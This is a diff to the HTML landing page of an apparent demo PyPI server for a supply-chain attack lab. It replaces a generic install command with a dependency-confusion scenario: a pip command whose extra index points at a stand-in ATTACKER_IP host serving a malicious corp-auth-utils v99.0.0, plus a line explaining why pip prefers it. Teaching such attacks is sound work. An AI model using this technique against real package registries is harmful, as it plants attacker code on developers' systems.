@@ -9,13 +9,14 @@
     </style>
 </head>
 <body>
-    <h1>Welcome to S04 Private PyPI Server!</h1>
-    <p>This is a custom PyPI compatible package index serving malicious packages for the S04 Supply Chain Demo.</p>
+    <h1>S04 Dependency Confusion Demo — PyPI Server</h1>
+    <p>This server simulates a public PyPI registry hosting a malicious <code>corp-auth-utils</code> v99.0.0 package for the S04 Supply Chain Attack demo.</p>
     
-    <h3>To use this server with pip, run the following command:</h3>
+    <h3>Dependency Confusion scenario:</h3>
     <div class="command">
-        pip install PACKAGE_NAME --index-url http://ATTACKER_LAN_IP:8000/simple/ --trusted-host ATTACKER_LAN_IP
+        pip install corp-auth-utils --index-url http://INTERNAL_REGISTRY:8000/simple/ --extra-index-url http://ATTACKER_IP:9000/simple/
     </div>
+    <p>pip will choose v99.0.0 from this server over v1.0.0 from the internal registry.</p>
 
     <p>The complete list of all packages can be found <a href="/packages/">here</a> </p>
     
